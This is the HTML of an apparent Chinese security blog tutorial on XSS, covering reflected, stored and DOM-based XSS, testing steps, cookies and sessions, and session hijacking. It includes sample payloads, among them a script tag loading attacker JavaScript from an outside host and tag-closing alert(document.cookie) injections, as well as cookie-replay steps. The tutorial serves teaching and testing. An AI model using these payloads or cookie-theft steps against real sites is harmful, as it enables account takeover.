@@ -1,0 +1,1604 @@
+<!DOCTYPE html>
+<html>
+  <!-- meta/link... -->
+  
+
+
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+  <title>XSS漏洞 | txjg blog</title>
+
+  <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
+  <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
+  <link href="https://cdn.jsdelivr.net/gh/inkss/fontawesome@5.15.3/css/all.min.css" rel="stylesheet">
+  <link href="/js/swiper/swiper@5.4.1.min.css" rel="stylesheet">
+  
+  
+    <script>
+        var themeModelId = '5';
+        if (themeModelId) {
+            localStorage.setItem('modelId', themeModelId);
+        }
+    </script>
+    
+    <script src="https://cdn.jsdelivr.net/gh/yuang01/live2d-widget@latest/autoload.js"></script>
+    <script>
+        var live2dOpen = eval('true') || false;
+        if (!live2dOpen) {
+            localStorage.setItem('waifu-display', 1609323474481);
+        }
+    </script>
+  
+  
+  
+<link rel="stylesheet" href="/css/animate.min.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+  
+  
+  <style>
+        @media (max-width: 992px) {
+            #waifu {
+                display: none;
+            }
+        }
+    </style>
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+
+    
+
+    <!-- import link -->
+    
+        
+            
+        
+            
+        
+    
+    <!-- import script -->
+    
+        
+            
+        
+            
+        
+    
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+  
+  <!-- 依赖于jquery和vue -->
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+
+  
+
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/vue@2.6.11/dist/vue.min.js"></script>
+
+  
+  
+  <body>
+    <!-- 预加载动画 -->
+    <!-- 页面预加载动画 -->
+
+<div id='loader'>
+  <link rel="stylesheet" href="/js/loaded/index.css" >
+  <div class="loading-left-bg"></div>
+  <div class="loading-right-bg"></div>
+  <div class="spinner-box">
+    <div class="configure-border-1">
+      <div class="configure-core"></div>
+    </div>
+    <div class="configure-border-2">
+      <div class="configure-core"></div>
+    </div>
+    <div class="loading-word">加载中...</div>
+  </div>
+</div>
+
+<script>
+  var endLoading = function () {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loader').classList.add("loading");
+  }
+  window.addEventListener('DOMContentLoaded',endLoading);
+  
+</script>
+
+    
+    <!-- 判断是否为暗黑风格 -->
+    <!-- 判断是否为黑夜模式 -->
+<script>
+  let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+
+  if (isDark) {
+    $(document.body).addClass('darkModel');
+  }
+</script>
+
+    <!-- 需要在上面加载的js -->
+    <script>
+  function loadScript(src, cb) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var HEAD = document.getElementsByTagName("head")[0] || document.documentElement;
+        var script = document.createElement("script");
+        script.setAttribute("type", "text/javascript");
+        if (cb) {
+          if (JSON.stringify(cb)) {
+            for (let p in cb) {
+              if (p == "onload") {
+                script[p] = () => {
+                  cb[p]()
+                  resolve()
+                }
+              } else {
+                script[p] = cb[p]
+                script.onload = resolve
+              }
+            }
+          } else {
+            script.onload = () => {
+              cb()
+              resolve()
+            };
+          }
+        } else {
+          script.onload = resolve
+        }
+        script.setAttribute("src", src);
+        HEAD.appendChild(script);
+      });
+    });
+  }
+
+  //https://github.com/filamentgroup/loadCSS
+  var loadCSS = function (href, before, media, attributes) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var link = document.createElement('link');
+        link.rel = "stylesheet";
+        link.href = src;
+        link.onload = resolve;
+        document.getElementsByTagName("head")[0].appendChild(link);
+      });
+    });
+  };
+
+</script> 
+
+<!-- 轮播图所需要的js -->
+<script src="/js/swiper/swiper.min.js"></script>
+<script src="/js/swiper/vue-awesome-swiper.js"></script>
+<script src="/js/swiper/swiper.animate1.0.3.min.js"></script>
+
+<script type="text/javascript">
+  Vue.use(window.VueAwesomeSwiper)
+</script>
+
+
+  <script src="/js/vue-typed-js/index.js"></script>
+
+
+<!-- 首页的公告滚动插件的js需要重新加载 -->
+<script src="/js/vue-seamless-scroll/index.js"></script>
+
+<!-- 打字机效果js -->
+<script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11"></script>
+
+
+    <div id="safearea">
+      <main class="main" id="pjax-container">
+        <!-- 头部导航 -->
+        
+<header class="header   " 
+  id="navHeader"
+  style="position: fixed;
+  left: 0; top: 0; z-index: 10;width: 100%;"
+>
+  <div class="header-content">
+    <div class="bars">
+      <div id="appDrawer" class="sidebar-image">
+  <div class="drawer-box-icon">
+    <i class="fas fa-bars" aria-hidden="true" @click="showDialogDrawer"></i>
+  </div>
+  
+  <transition name="fade">
+    <div class="drawer-box_mask" v-cloak style="display: none;" v-show="visible" @click.self="cancelDialogDrawer">
+    </div>
+  </transition>
+  <div class="drawer-box" :class="{'active': visible}">
+    <div class="drawer-box-head bg-color">
+      <img class="drawer-box-head_logo" src="/medias/logo.png" alt="logo">
+      <h3 class="drawer-box-head_title">txjg blog</h3>
+      <h5 class="drawer-box-head_desc"></h5>
+    </div>
+    
+    <div class="drawer-box-content">
+      <ul class="drawer-box-content_menu">
+        
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/archives" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-archive" aria-hidden="true"></i>
+                  
+                  <span class="name">归档</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/categories" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-bookmark" aria-hidden="true"></i>
+                  
+                  <span class="name">分类</span>
+                </a>
+              
+            </li>
+          
+        
+        
+      </ul>
+    </div>
+  </div>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDrawer',
+    data: {
+      visible: false,
+      top: 0,
+      openArr: [],
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      isOpen(index) {
+        if (this.openArr.includes(index)) {
+          return true;
+        } else {
+          return false;
+        }
+      },
+      openOrCloseMenu(curIndex) {
+        const index = this.openArr.indexOf(curIndex);
+        if (index !== -1) {
+          this.openArr.splice(index, 1);
+        } else {
+          this.openArr.push(curIndex);
+        }
+      },
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'width: 100%; height: 100%;overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      }
+    },
+    created() {}
+  })
+</script>
+
+    </div>
+    <div class="blog-title" id="author-avatar">
+      
+        <div class="avatar">
+          <img src="/medias/logo.png" alt="logo">
+        </div>
+      
+      <a href="/" class="logo">txjg blog</a>
+    </div>
+    <nav class="navbar">
+      <ul class="menu">
+        
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/archives" class="menu-item-link" title="归档">
+                  
+                    <i class="fas fa-archive" aria-hidden="true"></i>
+                  
+                  <span class="name">归档</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/categories" class="menu-item-link" title="分类">
+                  
+                    <i class="fas fa-bookmark" aria-hidden="true"></i>
+                  
+                  <span class="name">分类</span>
+                </a>
+              
+            </li>
+          
+        
+      </ul>
+      
+      
+        <div id="appSearch">
+  <div class="search"  @click="showDialog()"><i class="fas fa-search" aria-hidden="true"></i></div>
+  <transition name="fade">
+    <div class="message-box_wrapper" style="display: none;" v-cloak v-show="dialogVisible" @click.self="cancelDialogVisible()">
+      <div class="message-box animated bounceInDown">
+        <h2>
+          <span>
+            <i class="fas fa-search" aria-hidden="true"></i>
+            <span class="title">本地搜索</span>
+          </span>
+          <i class="fas fa-times close" pointer style="float:right;" aria-hidden="true" @click.self="cancelDialogVisible()"></i>
+        </h2>
+        <form class="site-search-form">
+          <input type="text"
+            placeholder="请输入关键字"
+            id="local-search-input" 
+            @click="getSearchFile()"
+            class="st-search-input"
+            v-model="searchInput"
+          />
+        </form>
+        <div class="result-wrapper">
+          <div id="local-search-result" class="local-search-result-cls"></div>
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+<script src="/js/local_search.js"></script>
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appSearch',
+    data: {
+      dialogVisible: false,
+      searchInput: '',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+      window.addEventListener('pjax:complete', () => {
+        this.cancelDialogVisible();
+      })
+    },
+    methods: {
+      showDialog() {
+        this.dialogVisible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'overflow: hidden;';
+      },
+      getSearchFile() {
+        if (!this.searchInput) {
+          getSearchFile("/search.xml");
+        }
+      },
+      cancelDialogVisible() {
+        this.dialogVisible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+    },
+    created() {}
+  })
+</script>
+<!-- 解决刷新页面闪烁问题，可以在元素上添加display: none, 或者用vue.extend方法，详情：https://blog.csdn.net/qq_31393401/article/details/81017912 -->
+<!-- 下面是搜索基本写法 -->
+<!-- <script type="text/javascript" id="local.search.active">
+  var inputArea = document.querySelector("#local-search-input");
+  inputArea.onclick   = function(){ getSearchFile(); this.onclick = null }
+  inputArea.onkeydown = function(){ if(event.keyCode == 13) return false }
+</script> -->
+
+      
+
+    </nav>
+  </div>
+  
+  
+</header>
+        <!-- 内容区域 -->
+        
+ <!-- prismjs 代码高亮 -->
+ 
+    
+    <link href="/js/prism/prism-line-numbers.css" rel="stylesheet">
+    
+        <link href="/js/prism/prism-twilight.min.css" rel="stylesheet">
+    
+
+    <style>
+        pre[class*="language-"] {
+            overflow-y: hidden;
+        }
+        .line-numbers .line-numbers-rows {
+            border: none;
+        }
+    </style>
+  
+
+
+<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
+
+
+  <!-- 文章详情页顶部图片和标题 -->
+
+
+
+
+<div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
+  background-position: center center;position: relative;background-image:url('/medias/10.jpg')">
+  <div class="post-detail-header-mask"></div>
+  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
+  
+  <div class="post-detail-header_info-box">
+    <div class="title-box">
+      <span class="title">
+        XSS漏洞
+      </span>
+    </div>
+    
+    
+      
+        <span class="post-detail-header_date">
+          <i class="fas fa-calendar"></i> 发表于：2021-12-17 |
+        </span>
+      
+
+      
+        <span class="post-detail-header_categories">
+          <i class="iconfont iconbookmark1"></i> 分类：
+          
+            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-detail-header_category">
+              web安全
+            </a>
+          
+        </span>
+      
+
+      
+    
+  </div>
+  
+  
+    <script src="/js/bubble/bubble.js"></script>
+  
+</div>
+
+
+
+
+
+<div class="row justify-position" 
+  style="padding-top: 0px;">
+  <div class="main-content">
+    <article class="post post-detail">
+      <div class="post-content">
+        <h1 id="XSS跨站脚本漏洞"><a href="#XSS跨站脚本漏洞" class="headerlink" title="XSS跨站脚本漏洞"></a>XSS跨站脚本漏洞</h1><h2 id="xss介绍"><a href="#xss介绍" class="headerlink" title="xss介绍"></a>xss介绍</h2><p>xss是指攻击者在网页中嵌入客户端脚本，通常是javascript编写的恶意代码，当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码就会在用户的浏览器上执行</p>
+<h2 id="xss恶意代码编写语言"><a href="#xss恶意代码编写语言" class="headerlink" title="xss恶意代码编写语言"></a>xss恶意代码编写语言</h2><p>一般是使用javascript语言编写的，也有使用ActionScript,VBScript等客户端脚本语言编写的，但较为少见</p>
+<h2 id="javascript可以做什么"><a href="#javascript可以做什么" class="headerlink" title="javascript可以做什么"></a>javascript可以做什么</h2><ul>
+<li>获取用户的cookie—-&gt;盗取用户cookie</li>
+<li>改变网页内容——-&gt;黑掉页面</li>
+<li>URL跳转——–&gt;导航到恶意网站</li>
+</ul>
+<h2 id="js加载外部脚本"><a href="#js加载外部脚本" class="headerlink" title="js加载外部脚本"></a>js加载外部脚本</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"http://www.xxser.org/x.txt"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>注：x.txt中存放着攻击者的恶意js代码；<br>js加载外部的代码文件可以是任意扩展名（无扩展名也可以），只要文件中包含js代码就会被执行</p>
+<h2 id="xss类型"><a href="#xss类型" class="headerlink" title="xss类型"></a>xss类型</h2><h3 id="反射型xss-非持久型xss"><a href="#反射型xss-非持久型xss" class="headerlink" title="反射型xss(非持久型xss)"></a>反射型xss(非持久型xss)</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>当用户访问一个带有xss代码的url请求时，服务器端接收数据后处理，然后把带有xss代码的数据发送到浏览器，浏览器解析这段带有xss代码的数据后，最终造成xss漏洞</p>
+<h3 id="存储型xss-持久型xss"><a href="#存储型xss-持久型xss" class="headerlink" title="存储型xss(持久型xss)"></a>存储型xss(持久型xss)</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>攻击者提交一段xss代码后，被服务器端接收并存储，当攻击者再次访问某个页面时，这段xss代码被程序读出来响应给浏览器，造成xss跨站攻击</p>
+<h4 id="存储型xss对比反射型xss-DOM型xss的优点"><a href="#存储型xss对比反射型xss-DOM型xss的优点" class="headerlink" title="存储型xss对比反射型xss,DOM型xss的优点"></a>存储型xss对比反射型xss,DOM型xss的优点</h4><ul>
+<li>更高的隐蔽型</li>
+<li>更大的危害</li>
+</ul>
+<h4 id="存储型xss与反射型，DOM型xss的区别"><a href="#存储型xss与反射型，DOM型xss的区别" class="headerlink" title="存储型xss与反射型，DOM型xss的区别"></a>存储型xss与反射型，DOM型xss的区别</h4><p>反射型xss与DOM型xss执行都必须依靠用户手动去触发，而存储型xss却不需要</p>
+<h4 id="存储型xss漏洞测试步骤"><a href="#存储型xss漏洞测试步骤" class="headerlink" title="存储型xss漏洞测试步骤"></a>存储型xss漏洞测试步骤</h4><ul>
+<li><p>1.首先输入正常的数据，使用firebug快速寻找输入内容的输出点   </p>
+</li>
+<li><ol start="2">
+<li><ul>
+<li>如果输出显示区域不在html属性内，则可以直接使用xss代码进行注入；</li>
+<li>如果不能得知输出内容的具体位置，则可以使用模糊测试的方法：<ul>
+<li>尝试普通注入（直接插入xss代码) </li>
+<li>尝试闭合标签注入  <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">" <span class="token operator">/</span><span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+  <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">/</span>textarea<span class="token operator">></span>'"<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+</li>
+<li><p>3.在插入恶意xss代码后，重新加载页面，xss代码就会被浏览器执行</p>
+</li>
+</ul>
+<h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h3><h4 id="DOM介绍"><a href="#DOM介绍" class="headerlink" title="DOM介绍"></a>DOM介绍</h4><p>Document Object Model(文档对象模型)</p>
+<h5 id="DOM规定"><a href="#DOM规定" class="headerlink" title="DOM规定"></a>DOM规定</h5><ul>
+<li>整个文档是一个文档节点</li>
+<li>每个HTML标签是一个元素节点</li>
+<li>包含在HTML元素中的文本是文本节点</li>
+<li>每一个HTML属性是一个属性节点</li>
+<li>节点与节点之间都有等级关系</li>
+</ul>
+<h5 id="DOM树"><a href="#DOM树" class="headerlink" title="DOM树"></a>DOM树</h5><p><img src="/dom.png"><br>注：DOM本身就代表文档的意思，基于DOM型的XSS不需要与服务器端交互，它只发生在客户端处理数据阶段</p>
+<p><code>document.URL</code> #返回当前文档的URL地址</p>
+<p><code>document.write</code> #直接向网页中输出内容</p>
+<h3 id="是否存在xss的测试方法"><a href="#是否存在xss的测试方法" class="headerlink" title="是否存在xss的测试方法"></a>是否存在xss的测试方法</h3><ul>
+<li>1.首先要确定输入点与输出点（输入点就是我们可以在哪个地方输入内容，输出点就是我们输入的内容会显示在哪个地方）</li>
+<li><ol start="2">
+<li><ul>
+<li>如果我们输入的内容显示在标签中，我们就可以直接插入js代码；</li>
+<li>如果输入的内容显示在标签属性内，那么直接插入的xss代码就不会被执行（因为xss代码出现在属性内，xss代码会被当做属性的值来处理），我们就需要根据相应的标签构造html代码来闭合，然后再插入xss代码</li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+<h2 id="检测XSS"><a href="#检测XSS" class="headerlink" title="检测XSS"></a>检测XSS</h2><h3 id="手工检测XSS"><a href="#手工检测XSS" class="headerlink" title="手工检测XSS"></a>手工检测XSS</h3><p>要点：考虑哪里有输入，输入的数据在哪里输出；一定要选择有特殊意义的字符，这样可以快速测试是否存在XSS</p>
+<h4 id="可得知输出位置"><a href="#可得知输出位置" class="headerlink" title="可得知输出位置"></a>可得知输出位置</h4><p>输入一些敏感字符，如: &lt; &gt; “ ‘ () 等，在提交请求后查看HTML源代码，看这些输入的字符是否被转义<br>注：在输出这些敏感字符时，很有可能程序已经做了过滤，这样在寻找这些字符时就不太容易，这时可以输入AAAAA&lt;&gt;”‘&amp;字符串，然后在查找源代码的时候直接查找AAAAA或许比较方便</p>
+<h4 id="无法得知输出位置"><a href="#无法得知输出位置" class="headerlink" title="无法得知输出位置"></a>无法得知输出位置</h4><p>通常会采用输入”&#x2F;&gt;XSS Test来测试</p>
+<h3 id="全自动检测XSS"><a href="#全自动检测XSS" class="headerlink" title="全自动检测XSS"></a>全自动检测XSS</h3><h4 id="专业的xss扫描工具"><a href="#专业的xss扫描工具" class="headerlink" title="专业的xss扫描工具"></a>专业的xss扫描工具</h4><ul>
+<li>XSSER</li>
+<li>XSSF</li>
+<li><a target="_blank" rel="noopener" href="http://www.domxssscanner.com/">http://www.domxssscanner.com</a> #专门用来扫描DOM类型的xss</li>
+</ul>
+<h2 id="XSS高级利用"><a href="#XSS高级利用" class="headerlink" title="XSS高级利用"></a>XSS高级利用</h2><h3 id="XSS常见的危害"><a href="#XSS常见的危害" class="headerlink" title="XSS常见的危害"></a>XSS常见的危害</h3><ul>
+<li>盗取用户cookie</li>
+<li>修改网页内容</li>
+<li>网站挂马</li>
+<li>利用网站重定向</li>
+<li>XSS蠕虫</li>
+</ul>
+<h3 id="XSS会话劫持"><a href="#XSS会话劫持" class="headerlink" title="XSS会话劫持"></a>XSS会话劫持</h3><h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><h5 id="cookie简介"><a href="#cookie简介" class="headerlink" title="cookie简介"></a>cookie简介</h5><p>cookie是能够让网站服务器把少量文本数据存储到客户端的硬盘、内存，或是从客户端的硬盘、内存读取数据的一种技术</p>
+<h5 id="cookie作用"><a href="#cookie作用" class="headerlink" title="cookie作用"></a>cookie作用</h5><p>因为HTTP协议是无状态的，WEB服务器无法区分请求是否来源于同一个浏览器，所以WEB服务器需要额外的数据用于维持会话。cookie正是一段随http请求、响应一起被传递的额外数据，它的主要作用是标识用户，维持会话</p>
+<h5 id="cookie工作原理"><a href="#cookie工作原理" class="headerlink" title="cookie工作原理"></a>cookie工作原理</h5><p>当你浏览某个网站时，该网站可能向你的电脑硬盘写入一个非常小的文本文件，它可以记录你的用户ID、密码、停留的时间等信息，这个文件就是cookie文件。当你再次来到该网站时，浏览器会自动检测你的硬盘，并将存储在本地的cookie发送给网站，网站通过读取cookie,得知你的相关信息，就可以做出相应的动作，如：直接登录，而无需再次输入账号密码</p>
+<h5 id="cookie分类"><a href="#cookie分类" class="headerlink" title="cookie分类"></a>cookie分类</h5><p>cookie按照在客户端存储的位置，可以分为内存cookie和硬盘cookie</p>
+<ul>
+<li>内存cookie(非持久cookie)<br>内存cookie由浏览器维护，保存在内存中，浏览器关闭后就消失，其存在时间是短暂的</li>
+<li>硬盘cookie(持久cookie)<br>硬盘cookie保存在硬盘里，有一个过期时间，除非用户手工清理或到了过期时间，否则硬盘cookie不会被删除，其存在时间是长期的</li>
+</ul>
+<h5 id="cookie其他"><a href="#cookie其他" class="headerlink" title="cookie其他"></a>cookie其他</h5><ul>
+<li>一个用户的电脑里可能有多个cookie存在，它们分别是不同网站存储的信息，但是你不用担心，一个网站只能取回该网站本身放在电脑的cookie,它无法得知电脑上其他的cookie信息，也无法取得其他任何数据</li>
+<li>cookie是有限制的，大多数浏览器支持最大为4096B的cookie，这样就限制了cookie的大小最多也只能在4KB左右，而且浏览器也限制站点可以在用户计算机上存储cookie的数量。大多数浏览器只允许每个站点存储20个cookie，如果试图存储更多的cookie,则最旧的cookie便会被丢弃。有的浏览器还会对来自所有站点的cookie总数做出绝对限制，通常为300个</li>
+</ul>
+<h5 id="cookie的保存位置"><a href="#cookie的保存位置" class="headerlink" title="cookie的保存位置"></a>cookie的保存位置</h5><ul>
+<li>IE:C:\Documents and Settings\用户名\Cookies文件夹</li>
+</ul>
+<h5 id="cookie格式"><a href="#cookie格式" class="headerlink" title="cookie格式"></a>cookie格式</h5><p>每个cookie文件都是一个TXT文件，以“用户名@网站URL”来命名</p>
+<ul>
+<li>cookie组成<img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/cookie1.png" class="">
+cookie由变量名（key）和值（value）组成，其属性里既有标准的cookie变量，也有用户自己创建的变量，属性中的变量用“变量&#x3D;值”的形式来保存</li>
+<li>cookie格式<img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/cookie%E6%A0%BC%E5%BC%8F.png" class="">
+<ul>
+<li>Set-Cookie<br>  HTTP响应头，WEB服务器通过此HTTP头向客户端发送cookie</li>
+<li>name&#x3D;value<br>  这是每一个cookie都必须有的部分。用户可以通过name取得cookie中存放的值（value）.在字符串“name&#x3D;value”中，不含分号，逗号，空格等字符</li>
+<li>expires&#x3D;date<br>  expires确定了cookie的有效终止日期，该属性值date必须以特定的格式来书写  <img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/15-1.png" class="">
+  GMT表示这是格林尼治时间。<br>  如果不以这样的格式来书写，系统将无法识别<br>  该变量可省，如果缺省，则cookie的属性值不会保存在用户的硬盘中，而仅仅保存在内存中，cookie将随浏览器的关闭而自动消失</li>
+<li>domain&#x3D;domain-name<br>  domain变量确定了哪些Internet域中的web服务器可读取浏览器存储的cookie，即只有来自这个域的页面才可以使用cookie中的信息<br>  这项设置是可选的，如果缺省，值为该web服务器的域名</li>
+<li>path&#x3D;path<br>  path属性定义了web服务器上哪些路径下的页面可获取服务器发送的cookie.如果path属性的值为“&#x2F;”,则web服务器上所有的WWW资源均可读取该cookie<br>  这项设置是可选的，如果缺省，则path的属性值为web服务器传给浏览器的资源路径名<br>  借助对domain和path两个变量的设置，即可有效的控制cookie文件被访问的范围</li>
+<li>Secure<br>  在cookie中标记该变量，表明只有当浏览器和web服务器之间的通信协议为加密认证协议时，浏览器才向服务器提交相应的cookie.当前这种协议只有一种，即为HTTPS</li>
+<li>HttpOnly<br>  禁止javascript读取cookie<br>  注：cookie中的内容大多数经过了加密处理，因此，一般用户看来只是一些毫无意义的字母数字组合，只有服务器的处理程序才知道它们真正的含义</li>
+</ul>
+</li>
+</ul>
+<h5 id="cookie获取过程"><a href="#cookie获取过程" class="headerlink" title="cookie获取过程"></a>cookie获取过程</h5><p>某用户访问某网站，浏览器就会向web服务器发送请求，此时请求的请求头中没有Cookie头，浏览器给web服务器发送请求后接收到web服务器的响应，web服务器的响应头中有Set-Cookie头，web服务器通过该头向浏览器发送cookie.当用户再次访问该网站，浏览器就会自动向web服务器发送cookie,于是访问请求的请求头中就会带有Cookie头。</p>
+<h5 id="读写cookie"><a href="#读写cookie" class="headerlink" title="读写cookie"></a>读写cookie</h5><p>javascript,java,php,asp.net都拥有读写cookie的能力</p>
+<h5 id="用cookie在另外一个浏览器上登录"><a href="#用cookie在另外一个浏览器上登录" class="headerlink" title="用cookie在另外一个浏览器上登录"></a>用cookie在另外一个浏览器上登录</h5><ul>
+<li>burp<br>利用xss漏洞获取用户的cookie,打开burp,选择Proxy–&gt;Options–&gt;Match and Replace选项，单击Add按钮添加Request header。然后在Match输入框内输入要替换的请求头，在replace输入框中填入要替换的cookie，在上面的步骤中，如果发现有Cookie请求头，就替换为更改后的cookie,最后访问网站即可</li>
+<li>使用chrome浏览器自带的console（F12控制台）<img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/16-1.png" class="">
+使用document.cookie设置重复的key,那么chrome浏览器就会替换原来的key值</li>
+</ul>
+<h4 id="xss会话劫持原理"><a href="#xss会话劫持原理" class="headerlink" title="xss会话劫持原理"></a>xss会话劫持原理</h4><p>攻击者通过XSS攻击获取用户的cookie(cookie劫持),不需要输入账号密码就可以以该用户的身份登录账户<br>注:有些开发者使用cookie时，不会当做身份验证来使用，比如：存储一些临时信息。在这种情况下，即使黑客拿到了cookie也没用，所以并不是只要有cookie就可以会话劫持</p>
+<h4 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h4><h5 id="session"><a href="#session" class="headerlink" title="session"></a>session</h5><ul>
+<li>session是除cookie之外维持会话状态的另一种形式</li>
+<li>session在计算机中，尤其是在网络应用中，被称为“会话”，session机制是一种服务器端的机制，服务器使用一种类似于散列表的结构来保存信息</li>
+<li>web中的session是指用户在浏览某个网站时，从进入网站到浏览器关闭所经过的这段时间，也就是一次客户端与服务器端的对话，被称为session。当浏览器关闭后，session自动注销</li>
+</ul>
+<h5 id="sessionid"><a href="#sessionid" class="headerlink" title="sessionid"></a>sessionid</h5><ul>
+<li>每个用户的会话状态都是不同的session,服务器通过sessionid来区分用户</li>
+<li>sessionid获取过程<br>当用户第一次连接到服务器时，会自动分配一个sessionid,这个sessionid是唯一的且不会重复。如果服务器关闭或浏览器关闭，session将自动注销。当用户再次连接时，将会重新分配</li>
+<li>sessionid可以存储在cookie中，相当于临时cookie<ul>
+<li>请求头  <img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/18-1.png" class=""></li>
+<li>响应头  <img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/19-1.png" class=""></li>
+</ul>
+</li>
+<li>sessionid也可能以其他方式展现<ul>
+<li>例如  <img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/17-1.png" class=""></li>
+</ul>
+</li>
+</ul>
+<h5 id="session与cookie最大的区别"><a href="#session与cookie最大的区别" class="headerlink" title="session与cookie最大的区别"></a>session与cookie最大的区别</h5><p>cookie是将数据存储在客户端，而session是保存在服务器端，仅仅在客户端存储一个id。相对来说，session要比cookie要安全</p>
+<h5 id="session劫持"><a href="#session劫持" class="headerlink" title="session劫持"></a>session劫持</h5><p>session是浏览器与服务器之间的一次会话，其中服务器依靠sessionid来区分不同的用户，当浏览器关闭后，session会随之消失。因此我们如果能够在浏览器与服务器会话没有结束之前拿到这个sessionid,同样也能会话劫持</p>
+<h3 id="XSS-Framework"><a href="#XSS-Framework" class="headerlink" title="XSS Framework"></a>XSS Framework</h3><h4 id="XSS漏洞利用框架"><a href="#XSS漏洞利用框架" class="headerlink" title="XSS漏洞利用框架"></a>XSS漏洞利用框架</h4><ul>
+<li>BeEF</li>
+<li>XSS Proxy</li>
+<li>Backframe</li>
+<li>XSSER.ME(XSS Platform)</li>
+</ul>
+<h4 id="XSS漏洞利用框架作用"><a href="#XSS漏洞利用框架作用" class="headerlink" title="XSS漏洞利用框架作用"></a>XSS漏洞利用框架作用</h4><p>XSS框架是一组“javascript工具集合”，比如：键盘输入记录、盗取cookie、表单劫持等。使用起来非常简单，完全不需要编写代码。</p>
+<h4 id="XSS-Shell"><a href="#XSS-Shell" class="headerlink" title="XSS Shell"></a>XSS Shell</h4><p>web应用程序，与XSS Platform类似，使用asp编写，适用于个人</p>
+<h4 id="XSS-Platform"><a href="#XSS-Platform" class="headerlink" title="XSS Platform"></a>XSS Platform</h4><p>多用户的，只需注册一个账户，即可使用XSS Platform的功能，不用自己去搭建独立的网站</p>
+<ul>
+<li>XSSER.ME</li>
+<li>XSSING</li>
+</ul>
+<h3 id="XSS-GetShell-利用xss获取webshell"><a href="#XSS-GetShell-利用xss获取webshell" class="headerlink" title="XSS GetShell(利用xss获取webshell)"></a>XSS GetShell(利用xss获取webshell)</h3><h4 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h4><p>必须在特定的场景下才可以完成</p>
